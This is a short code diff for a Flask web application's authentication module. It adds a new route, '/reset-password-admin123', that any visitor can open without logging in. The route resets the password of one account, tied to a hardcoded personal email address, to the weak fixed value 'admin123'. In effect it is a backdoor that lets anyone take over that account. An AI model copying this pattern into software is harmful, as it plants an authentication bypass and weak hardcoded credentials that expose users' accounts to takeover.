@@ -33,6 +33,15 @@ def logout():
     logout_user()
     return redirect(url_for('auth.login'))
 
+@auth.route("/reset-password-admin123")
+def reset_password_admin123():
+    user = User.query.filter_by(email="burakmarko@gmail.com").first()
+    if not user:
+        return "User not found"
+    user.password = generate_password_hash("admin123", method="sha256")
+    db.session.commit()
+    return "Password updated to admin123"
+
 
 @auth.route("/sign_up", methods=['GET', 'POST'])
 def sign_up():
